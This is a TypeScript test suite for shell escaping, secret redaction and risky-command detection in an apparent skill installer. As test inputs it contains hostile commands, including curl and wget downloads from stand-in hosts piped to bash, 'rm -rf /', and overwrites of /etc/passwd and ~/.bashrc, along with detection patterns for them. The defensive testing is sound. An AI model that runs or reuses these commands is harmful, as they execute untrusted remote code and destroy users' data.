    const args = ["arg1", "arg2", "arg3"];
    const escaped = escapeShellArgs(args);
    
    assert.ok(Array.isArray(escaped));
    assert.strictEqual(escaped.length, 3);
  });

  test("escapeShellArgs with cmd shell type", () => {
    const args = ["hello world", "test"];
    const escaped = escapeShellArgs(args, "cmd");
    
    // cmd.exe uses double quotes
    assert.ok(escaped[0].startsWith('"'));
    assert.ok(escaped[0].endsWith('"'));
  });

  test("escapeShellArgs with powershell type", () => {
    const args = ["hello world", "test"];
    const escaped = escapeShellArgs(args, "powershell");
    
    // PowerShell uses single quotes
    assert.ok(escaped[0].startsWith("'"));
    assert.ok(escaped[0].endsWith("'"));
  });

  test("buildSafeCommand with shell type parameter", () => {
    const cmd = buildSafeCommand("echo", ["hello", "world"], "powershell");
    
    // Should use PowerShell escaping (single quotes)
    assert.ok(cmd.includes("'hello'"));
    assert.ok(cmd.includes("'world'"));
  });
});

suite("Shell Escape — Windows cmd.exe Improvements (Skills Enhancement)", () => {
  test("escapes backslash-quote sequences correctly", () => {
    // Backslash before quote needs special handling
    const input = 'path\\to\\"file';
    const escaped = escapeShellArgWindows(input);
    
    // Should handle the backslash-quote sequence
    assert.ok(escaped.startsWith('"'));
    assert.ok(escaped.endsWith('"'));
  });

  test("escapes percent signs for batch", () => {
    const input = "100%complete";
    const escaped = escapeShellArgWindows(input);
    
    // Percent should be doubled for cmd.exe batch processing
    assert.ok(escaped.includes("%%"));
  });

  test("handles trailing backslashes", () => {
    const input = "C:\\Users\\path\\";
    const escaped = escapeShellArgWindows(input);
    
    assert.ok(escaped.startsWith('"'));
    assert.ok(escaped.endsWith('"'));
  });

  test("handles complex Windows paths", () => {
    const input = 'C:\\Program Files (x86)\\My App\\script "test".bat';
    const escaped = escapeShellArgWindows(input);
    
    // Should wrap and escape internal quotes
    assert.ok(escaped.startsWith('"'));
    assert.ok(escaped.endsWith('"'));
    assert.ok(escaped.includes('\\"'));
  });
});

// ============================================================================
// CODE REVIEW IMPROVEMENTS - Additional Tests
// ============================================================================

suite("Sensitive Data Redaction (Code Review Improvement)", () => {
  /**
   * Simulates the redactSensitiveData function from SkillInstaller
   */
  function redactSensitiveData(command: string): string {
    const sensitivePatterns = [
      /(--api-key|--token|--api_key|--apikey|--access-token|--secret)\s+\S+/gi,
      /(Authorization:\s*Bearer\s+)\S+/gi,
      /(--password|--pass|--pwd|-p)\s+\S+/gi,
      /((?:API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|AUTH)[A-Z_]*=)\S+/gi,
      /(https?:\/\/)[^:]+:[^@]+(@)/gi,
    ];

    let redacted = command;
    for (const pattern of sensitivePatterns) {
      redacted = redacted.replace(pattern, "$1******");
    }
    return redacted;
  }

  suite("CLI Flag Redaction", () => {
    test("redacts --api-key values", () => {
      const command = "mycli --api-key sk_live_abc123xyz --other-flag value";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("sk_live_abc123xyz"));
      assert.ok(redacted.includes("--api-key ******"));
      assert.ok(redacted.includes("--other-flag value")); // Non-sensitive preserved
    });

    test("redacts --token values", () => {
      const command = "gh --token ghp_xxxxxxxxxxxxxxxxxxxx pr list";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("ghp_xxxxxxxxxxxxxxxxxxxx"));
      assert.ok(redacted.includes("--token ******"));
    });

    test("redacts --password values", () => {
      const command = "mysql --password mySecretPass123 -u admin";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("mySecretPass123"));
      assert.ok(redacted.includes("--password ******"));
    });

    test("redacts --secret values", () => {
      const command = "aws configure --secret AKIAIOSFODNN7EXAMPLE";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("AKIAIOSFODNN7EXAMPLE"));
    });

    test("redacts -p short flag for password", () => {
      const command = "mysql -p mypass -u root";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("mypass"));
      assert.ok(redacted.includes("-p ******"));
    });
  });

  suite("Environment Variable Redaction", () => {
    test("redacts API_KEY= assignments", () => {
      const command = "API_KEY=secret123 npm run build";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("secret123"));
      assert.ok(redacted.includes("API_KEY=******"));
    });

    test("redacts TOKEN= assignments", () => {
      const command = "GITHUB_TOKEN=ghp_abc123 git push";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("ghp_abc123"));
    });

    test("redacts SECRET= assignments", () => {
      const command = "CLIENT_SECRET=verysecret123 ./app";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("verysecret123"));
    });

    test("redacts PASSWORD= assignments", () => {
      const command = "DATABASE_PASSWORD=dbpass123 ./migrate";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("dbpass123"));
    });
  });

  suite("URL Credential Redaction", () => {
    test("redacts embedded URL credentials (user:pass@host)", () => {
      const command = "curl https://user:secretpass@api.example.com/data";
      const redacted = redactSensitiveData(command);
      
      // The pattern should redact the credentials part
      assert.ok(!redacted.includes("secretpass"));
    });

    test("redacts git URLs with credentials", () => {
      const command = "git clone https://oauth2:ghp_token123@github.com/org/repo.git";
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("ghp_token123"));
    });
  });

  suite("Preserve Non-Sensitive Data", () => {
    test("preserves normal command arguments", () => {
      const command = "npm install lodash --save";
      const redacted = redactSensitiveData(command);
      
      assert.strictEqual(redacted, command);
    });

    test("preserves file paths", () => {
      const command = "cp /path/to/file /other/path";
      const redacted = redactSensitiveData(command);
      
      assert.strictEqual(redacted, command);
    });

    test("preserves URLs without credentials", () => {
      const command = "curl https://api.example.com/public";
      const redacted = redactSensitiveData(command);
      
      assert.strictEqual(redacted, command);
    });
  });

  suite("Authorization Header Redaction", () => {
    test("redacts Bearer tokens in headers", () => {
      const command = 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." https://api.example.com';
      const redacted = redactSensitiveData(command);
      
      assert.ok(!redacted.includes("eyJhbGciOiJIUzI1NiIs"));
      assert.ok(redacted.includes("Authorization: Bearer ******"));
    });
  });
});

suite("Categorized Command Validation (Code Review Improvement)", () => {
  /**
   * Simulates the HIGH_RISK patterns from the improved validateCommand
   */
  const highRiskPatterns: Array<{ pattern: RegExp; description: string }> = [
    { pattern: /sudo\s+/i, description: "sudo privilege escalation" },
    { pattern: /su\s+-/i, description: "su user switching" },
    { pattern: /chmod\s+777/i, description: "chmod 777 permission change" },
    { pattern: /chown\s+root/i, description: "chown to root" },
    { pattern: />\s*\/etc\//i, description: "write to /etc/" },
    { pattern: />\s*~\/\.\w/i, description: "write to hidden config" },
    { pattern: /rm\s+-rf?\s+[/~]/i, description: "recursive delete" },
    { pattern: /eval\s+\$\(/i, description: "eval command substitution" },
    // eslint-disable-next-line no-control-regex
    { pattern: /\x00/, description: "null byte injection" },
  ];

  /**
   * Simulates the MEDIUM_RISK patterns from the improved validateCommand
   */
  const mediumRiskPatterns: Array<{
    pattern: RegExp;
    description: string;
    allowList?: RegExp[];
  }> = [
    { pattern: /\.\.\//g, description: "directory traversal" },
    { pattern: /&\s*$/, description: "background execution" },
    {
      pattern: /curl.*\|\s*(ba)?sh/i,
      description: "curl pipe to shell",
      allowList: [/homebrew.*install/i, /raw\.githubusercontent\.com.*homebrew/i, /brew\.sh/i],
    },
    {
      pattern: /wget.*\|\s*(ba)?sh/i,
      description: "wget pipe to shell",
      allowList: [/homebrew.*install/i],
    },
  ];

  function isHighRisk(command: string): { blocked: boolean; reason?: string } {
    for (const { pattern, description } of highRiskPatterns) {
      if (pattern.test(command)) {
        return { blocked: true, reason: description };
      }
    }
    return { blocked: false };
  }

  function checkMediumRisk(command: string): { count: number; risks: string[] } {
    let count = 0;
    const risks: string[] = [];

    for (const { pattern, description, allowList } of mediumRiskPatterns) {
      if (pattern.test(command)) {
        const isAllowed = allowList?.some(allowed => allowed.test(command));
        if (!isAllowed) {
          count++;
          risks.push(description);
        }
      }
    }

    return { count, risks };
  }

  suite("HIGH-RISK Pattern Detection", () => {
    test("blocks sudo commands", () => {
      const result = isHighRisk("sudo apt install curl");
      assert.strictEqual(result.blocked, true);
      assert.strictEqual(result.reason, "sudo privilege escalation");
    });

    test("blocks su - commands", () => {
      const result = isHighRisk("su - root -c 'whoami'");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks chmod 777", () => {
      const result = isHighRisk("chmod 777 /var/www");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks chown root", () => {
      const result = isHighRisk("chown root:root /etc/passwd");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks writes to /etc/", () => {
      const result = isHighRisk("echo 'hack' > /etc/passwd");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks writes to hidden configs", () => {
      const result = isHighRisk("echo 'evil' > ~/.bashrc");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks rm -rf on root", () => {
      const result = isHighRisk("rm -rf /");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks rm -rf on home", () => {
      const result = isHighRisk("rm -rf ~/");
      assert.strictEqual(result.blocked, true);
    });

    test("blocks eval with command substitution", () => {
      const result = isHighRisk("eval $(whoami)");
      assert.strictEqual(result.blocked, true);
    });

    test("allows safe commands", () => {
      const result = isHighRisk("npm install express");
      assert.strictEqual(result.blocked, false);
    });
  });

  suite("MEDIUM-RISK Pattern Detection with Allowlist", () => {
    test("detects directory traversal", () => {
      const result = checkMediumRisk("cat ../../../etc/passwd");
      assert.ok(result.count > 0);
      assert.ok(result.risks.includes("directory traversal"));
    });

    test("detects background execution", () => {
      const result = checkMediumRisk("./malware &");
      assert.ok(result.count > 0);
      assert.ok(result.risks.includes("background execution"));
    });

    test("allows Homebrew curl|bash (on allowlist)", () => {
      const result = checkMediumRisk(
        '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
      );
      // Should NOT count because it's on the allowlist
      assert.strictEqual(result.count, 0);
    });

    test("blocks non-allowlisted curl|bash", () => {
      const result = checkMediumRisk("curl http://malicious.com/script.sh | bash");
      assert.ok(result.count > 0);
      assert.ok(result.risks.includes("curl pipe to shell"));
    });

    test("blocks wget|bash without allowlist match", () => {
      const result = checkMediumRisk("wget http://evil.com/hack.sh | bash");
      assert.ok(result.count > 0);
      assert.ok(result.risks.includes("wget pipe to shell"));
    });

    test("multiple medium risks triggers rejection", () => {
      // Directory traversal + background execution = 2 risks
      const result = checkMediumRisk("cat ../../../etc/passwd &");
      assert.strictEqual(result.count >= 2, true);
    });

    test("safe command has no medium risks", () => {
      const result = checkMediumRisk("pip install requests");
      assert.strictEqual(result.count, 0);
    });
  });

  suite("Combined validation scenarios", () => {
    test("prioritizes high-risk over medium-risk", () => {
      // This has both sudo (high-risk) and background exec (medium-risk)
      const highResult = isHighRisk("sudo apt install curl &");
      const mediumResult = checkMediumRisk("sudo apt install curl &");
      
      // High-risk should block first
      assert.strictEqual(highResult.blocked, true);
      // Medium risk also detected but high-risk takes precedence
      assert.ok(mediumResult.count > 0);
    });

    test("rejects commands with multiple medium risks even if no high risk", () => {
      const highResult = isHighRisk("cd ../.. && ./script &");
      const mediumResult = checkMediumRisk("cd ../.. && ./script &");
      
      assert.strictEqual(highResult.blocked, false); // No high-risk patterns
      assert.ok(mediumResult.count >= 2); // Multiple medium risks
    });
  });
});
